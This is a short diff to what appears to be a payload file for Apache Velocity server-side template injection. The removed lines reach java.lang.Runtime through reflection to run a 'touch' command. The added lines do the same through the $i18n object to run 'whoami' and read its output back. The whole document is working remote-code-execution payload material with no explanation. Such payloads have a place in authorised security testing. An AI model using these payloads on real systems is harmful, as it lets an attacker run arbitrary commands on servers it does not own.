@@ -1,2 +1,6 @@
-#set ($exp = "exp")
-$exp.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/touch /tmp/1.txt")
+#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami'))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$out.read()
+#end
